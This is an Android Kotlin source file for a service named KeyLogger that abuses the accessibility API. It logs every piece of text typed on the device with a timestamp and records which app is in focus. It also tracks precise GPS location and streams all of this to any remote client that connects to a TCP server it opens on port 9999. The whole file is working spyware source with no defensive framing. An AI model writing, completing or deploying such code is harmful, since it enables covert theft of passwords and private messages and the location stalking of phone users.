package com.example.keylogger

import android.Manifest
import android.accessibilityservice.AccessibilityService
import android.annotation.SuppressLint
import android.content.pm.PackageManager
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityEvent
import androidx.core.app.ActivityCompat
import com.google.android.gms.location.FusedLocationProviderClient
import com.google.android.gms.location.LocationCallback
import com.google.android.gms.location.LocationRequest
import com.google.android.gms.location.LocationResult
import com.google.android.gms.location.LocationServices
import com.google.android.gms.location.Priority
import kotlinx.coroutines.CoroutineScope
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.SupervisorJob
import kotlinx.coroutines.launch
import java.io.DataOutputStream
import java.io.IOException
import java.io.PrintWriter
import java.net.ServerSocket
import java.net.Socket
import java.text.SimpleDateFormat
import java.util.Date


class KeyLogger : AccessibilityService() {

    private lateinit var fusedLocationClient: FusedLocationProviderClient
    private lateinit var locationCallback: LocationCallback
    private lateinit var locationRequest: LocationRequest

    private val coroutineScope = CoroutineScope(Dispatchers.IO + SupervisorJob())  // Coroutine scope for background tasks
    private val clients = ArrayList<Socket>()
    override fun onServiceConnected() {
        super.onServiceConnected()

        fusedLocationClient = LocationServices.getFusedLocationProviderClient(this)
        locationRequest = LocationRequest.Builder(
            Priority.PRIORITY_HIGH_ACCURACY,
            10000
        ).setMinUpdateIntervalMillis(5000)
            .build()

        Log.d("keylogger", "Service Connected")
        try {
            coroutineScope.launch { startServer() }
        } catch (e: IOException) {
            throw RuntimeException(e)
        }

        locationCallback = object : LocationCallback() {
            override fun onLocationResult(locationResult: LocationResult) {
                for (location in locationResult.locations) {
                    coroutineScope.launch { sendToClient("Lat: ${location.latitude}, Lng: ${location.longitude}") }
                }
            }
        }
        if (ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_FINE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED && ActivityCompat.checkSelfPermission(
                this,
                Manifest.permission.ACCESS_COARSE_LOCATION
            ) != PackageManager.PERMISSION_GRANTED
        ) {
            return
        }
        fusedLocationClient.requestLocationUpdates(locationRequest ,locationCallback, Looper.getMainLooper())
    }

    @SuppressLint("NewApi")
    override fun onAccessibilityEvent(event: AccessibilityEvent) {
        val eventType = event.eventType
        when (eventType) {
            AccessibilityEvent.TYPE_VIEW_FOCUSED -> {
                val packageName = "[PackageName]" + event.packageName as String
                coroutineScope.launch { sendToClient(packageName) }
            }

            AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED -> {
                val dateFormat = SimpleDateFormat("yyyy-MM-dd HH:mm:ss") //设置日期格式
                val currentTime = "[" + dateFormat.format(Date()) + "]" // new Date()为获取当前系统时间
                val text = currentTime + event.text.toString()
                coroutineScope.launch { sendToClient(text) }
            }

            else -> {}
        }
    }

    override fun onInterrupt() {}

    @Throws(IOException::class)
    private fun startServer() {
        try {
            val serverSocket = ServerSocket(9999)
            while (true) {
                val client = serverSocket.accept()
                val inetAddress = client.remoteSocketAddress.toString()
                Log.d("ip address", inetAddress)
                clients.add(client)
            }
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }

    private fun sendToClient(message: String) {
        Log.d("keylogger", message + " " + clients.size)
        try {
            for (client in clients) {
                try{
                    val dataOutputStream = DataOutputStream(client.getOutputStream())
                    dataOutputStream.writeUTF(message)
                }catch (e: Exception) {
                    client.close()
                    clients.remove(client)
                    e.printStackTrace()
                }
            }
            Log.d("keylogger", message)
        } catch (e: Exception) {
            e.printStackTrace()
        }
    }
}
